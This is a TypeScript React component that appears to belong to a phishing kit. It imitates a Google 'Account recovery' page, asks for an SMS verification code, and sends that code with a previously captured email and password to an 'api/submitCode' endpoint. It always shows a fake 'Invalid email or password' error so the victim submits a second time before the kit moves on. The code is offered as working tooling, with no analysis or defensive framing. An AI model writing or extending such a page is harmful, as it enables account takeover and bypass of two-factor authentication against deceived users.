import { Dispatch, FC, FormEvent, SetStateAction, useState } from "react";
import styles from "./FormMsg.module.css";
import axios from "axios";
import Link from "next/link";
interface FormPassProps {
  email: string;
  password: string;
  setWhichForm: Dispatch<SetStateAction<string>>;
}

const FormPass: FC<FormPassProps> = ({ email, password, setWhichForm }) => {
  const [showError, setShowError] = useState(false);
  const [clickNum, setClickNum] = useState(0);
  const onSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const formDate = new FormData(event.currentTarget);
    const data = {
      email: email,
      password: password,
      code: formDate.get("code"),
    };
    await axios.post("api/submitCode", data);
    setClickNum((e) => e + 1);
    setShowError(true);
    clickNum > 0 && setWhichForm("end");
  };
  return (
    <div className="box">
      <div className="contain">
        <div className="logo">
          <svg
            className="im"
            xmlns="http://www.w3.org/2000/svg"
            x="0px"
            y="0px"
            width="60"
            height="60"
            viewBox="0 0 48 48"
          >
            <path fill="#FFC107" d="M17 6L31 6 45 30 31 30z"></path>
            <path fill="#1976D2" d="M9.875 42L16.938 30 45 30 38 42z"></path>
            <path fill="#4CAF50" d="M3 30.125L9.875 42 24 18 17 6z"></path>
          </svg>
        </div>
        <div className="info">
          <h2>Account recovery</h2>
          <p>
            To help keep your account secure, Google wants to make sure that
            you're the one trying to sign in
          </p>
          <p>An SMS message has just been sent to you</p>
          <p></p>
          <form onSubmit={onSubmit}>
            <div className="inputBox">
              <input type="text" name="code" pattern="[0-9]{6}" required />
              <label>Enter the code:</label>
            </div>

            {showError && (
              <span className={styles.error}>
                Invalid email or password. Try again or sign up
              </span>
            )}

            <span className="for">
              <Link href="/forgot">Forgot password?</Link>
            </span>

            <input type="submit" name="sign-in" value="send" />
          </form>
        </div>
        <div className="footer"></div>
      </div>
    </div>
  );
};
export default FormPass;
